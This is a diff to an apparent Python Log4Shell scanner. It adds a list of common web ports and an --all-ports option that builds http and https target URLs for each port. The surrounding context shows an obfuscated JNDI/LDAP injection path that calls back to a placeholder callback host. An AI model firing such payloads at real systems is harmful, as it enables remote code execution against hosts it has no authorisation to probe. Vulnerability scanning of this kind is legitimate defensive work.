@@ -67,6 +67,8 @@ paths = ['/',
     f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//{{callback_host}}/{{random}}%7B'
 ]
 
+typical_ports = ['8080', '8000', '10000', '8443', '7443', '8083', '8008', '81', '300', '591', '593', '832', '981', '1010', '1311', '1099', '2082', '2095', '2096', '2480', '3000', '3128', '3333', '4243', '4567', '4711', '4712', '4993', '5000', '5104', '5108', '5280', '5281', '5800', '6543', '7000', '7396', '7474', '8000', '8001', '8014', '8042', '8069', '8081', '8088', '8090', '8091', '8118', '8123', '8172', '8222', '8243', '8280', '8281', '8333', '8337', '8500', '8834', '8880', '8888', '8983', '9000', '9043', '9060', '9080', '9090', '9091', '9200', '9443', '9800', '9981', '11371', '12443', '16080', '18091', '18092', '20720', '55672', '2087', '28017']
+
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
@@ -127,6 +129,10 @@ parser.add_argument("--export",
 parser.add_argument("--resolve",
                     dest="resolve_ip",
                     help="Scan the IP URL (http://<IP>).",
+                    action='store_true')
+parser.add_argument("--all-ports",
+                    dest="all_ports",
+                    help="Scan The Domains/Sites Typical Ports.",
                     action='store_true')
 
 args = parser.parse_args()
@@ -351,10 +357,11 @@ def main():
                                 ips = []
                     path = urlparse.urlparse('http://'+original_url).path
                     port = urlparse.urlparse('http://'+original_url).port
-                    if port:
-                        i = f'{i}:{port}'
-                    if path != "":
-                        i = i + path
+                    if not args.all_ports:
+                        if port:
+                            i = f'{i}:{port}'
+                        if path != "":
+                            i = i + path
                 if valid_ip:
                     for ip in ips:
                         if ip and f'http://{ip}' not in urls:
@@ -371,8 +378,13 @@ def main():
                             except:
                                 pass
                 if not valid_ip and f'http://{i}' not in urls:
-                    urls.append(f'http://{i}')
-                    urls.append(f'https://{i}')
+                    if args.all_ports:
+                        for p in typical_ports:
+                            urls.append(f'http://{i}:{p}')
+                            urls.append(f'https://{i}:{p}')
+                    else:
+                        urls.append(f'http://{i}')
+                        urls.append(f'https://{i}')
 
         random.shuffle(urls)
 
